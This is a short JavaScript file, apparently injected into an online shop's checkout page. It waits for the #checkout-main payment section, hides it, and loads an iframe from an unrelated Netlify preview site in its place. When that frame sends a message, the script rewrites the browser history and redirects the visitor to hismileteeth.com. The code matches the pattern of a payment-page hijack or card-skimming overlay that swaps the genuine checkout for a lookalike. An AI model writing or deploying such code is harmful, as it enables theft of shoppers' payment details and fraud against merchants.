console.log(`this is script from from rl for smile`);
function resizeIframe(iframe) {
    console.log(`resizeIframe done`);
    // iframe.style.height =
    //     iframe.contentWindow.document.body.scrollHeight + "px";
    // iframe.style.height = "500px";
}
document.addEventListener("DOMContentLoaded", afterLoadingPage);
let paymentDivOr;
function afterLoadingPage() {
    console.log("Страница полностью загружена");
    paymentDivOr = document.querySelector(`#checkout-main`);
    console.log(`this is paymentDivOr`);
    console.log(paymentDivOr);
    checkIfPaymentDivOrExist();
}

function changePaymentDiv() {
    paymentDivOr.style.display = "none";
    const paymentDivNew = document.createElement("div");
    paymentDivNew.style.height = "100%";
    paymentDivNew.innerHTML = `<iframe src="https://66edff94da8e378d100776f2--zingy-dango-9f5772.netlify.app/smileframe/" style="width: 100%; height: 600px" onload="resizeIframe(this)"></iframe>`;
    paymentDivOr.insertAdjacentElement("afterend", paymentDivNew);
    window.addEventListener("message", function (event) {
        if (
            event.origin ===
            "https://66edff94da8e378d100776f2--zingy-dango-9f5772.netlify.app"
        ) {
            console.log("Сообщение из iframe:", event.data);
            window.history.pushState(null, null, window.location.href);
            window.location.replace("https://hismileteeth.com");
        }
    });
}

function checkIfPaymentDivOrExist() {
    if (paymentDivOr) {
        changePaymentDiv();
    } else {
        setTimeout(checkIfPaymentDivOrExist, 1000);
    }
}
